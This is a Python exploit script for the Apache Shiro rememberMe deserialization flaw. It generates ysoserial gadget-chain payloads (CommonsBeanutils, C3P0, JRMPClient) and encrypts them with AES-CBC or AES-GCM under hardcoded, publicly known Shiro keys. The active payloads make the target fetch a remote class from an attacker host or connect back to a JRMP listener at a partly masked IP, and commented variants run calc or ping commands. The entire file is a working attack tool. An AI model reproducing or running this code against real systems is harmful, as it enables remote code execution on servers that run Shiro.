# 参考：https://mp.weixin.qq.com/s/NZ174-fAnJzTNLzGBal7VA
def generate_ciphertext(key, bb):
	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	secret = base64.b64decode(key)  # 这里替换密钥
	#secret = base64.urlsafe_b64decode(key)
	iv = uuid.uuid4().bytes
	encryptor = AES.new(secret, AES.MODE_CBC, iv)
	file_body = pad(bb)
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

	print(key + ": " + str(base64_ciphertext))

	return base64_ciphertext

# 1.4.2之前的CBC模式
def generator2(key):
	ysoserial_path = 'D:\\repos\\ysoserial\\target\\ysoserial-0.0.8-SNAPSHOT-all.jar'
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.6.0_45\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Echo', '1'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl8', '1'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'ROME', 'ping 7777777777.rome.x.y.z'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.8.0_201\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl2', 'calc'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.8.0_201\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl5', '1'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsCollections5', 'calc'], stdout=subprocess.PIPE)
	# 前面都不能用的时候拿来用一下，从远程http服务下载一个class文件，class里的构造方法执行命令即可，原理参考：https://xz.aliyun.com/t/6965
	popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'C3P0', 'http://49.x.y.z:8888/:Test'], stdout=subprocess.PIPE)

	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	mode = AES.MODE_CBC
	iv = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	file_body = pad(popen.stdout.read())
	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))

	print(base64_ciphertext)
	return base64_ciphertext


# 1.4.2之后的GCM模式
# 参考：[深入利用Shiro反序列化漏洞](https://xz.aliyun.com/t/8445)
# https://github.com/apache/shiro/blob/8751ce1c31848efa96242099ba908bd110540246/RELEASE-NOTES
def generator3(key):
	ysoserial_path = 'D:\\repos\\ysoserial\\target\\ysoserial-0.0.8-SNAPSHOT-all.jar'
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.6.0_45\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Echo', '1'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl8', '1'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'ROME', 'ping 7777777777.rome.x.y.z'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.8.0_201\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl2', 'calc'], stdout=subprocess.PIPE)
	#popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.8.0_201\\bin\\java.exe', '-jar', ysoserial_path, 'CommonsBeanutils1_Cl5', '1'], stdout=subprocess.PIPE)
	popen = subprocess.Popen(['D:\\repos\\Java\\jdk1.7.0_80\\bin\\java.exe', '-jar', ysoserial_path, 'JRMPClient', '49.x.y.z:8877'], stdout=subprocess.PIPE)

	BS = AES.block_size
	pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
	mode = AES.MODE_GCM
	iv = uuid.uuid4().bytes
	encryptor = AES.new(base64.b64decode(key), mode, iv)
	file_body = pad(popen.stdout.read())
	ciphertext, tag = encryptor.encrypt_and_digest(file_body)
	ciphertext = ciphertext + tag
	base64_ciphertext = base64.b64encode(iv + ciphertext)

	print(base64_ciphertext)
	return base64_ciphertext



def test():

	# generate_ciphertext("nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3", payloadObj)
	#generator2("nhNhwZ6X7xzgXnnZBxWFQLwCGQtJojL3")
	#generator2("kPH+bIxk5D2deZiIxcaaaA==")
	generator3("kPH+bIxk5D2deZiIxcaaaA==")
  
  
test()
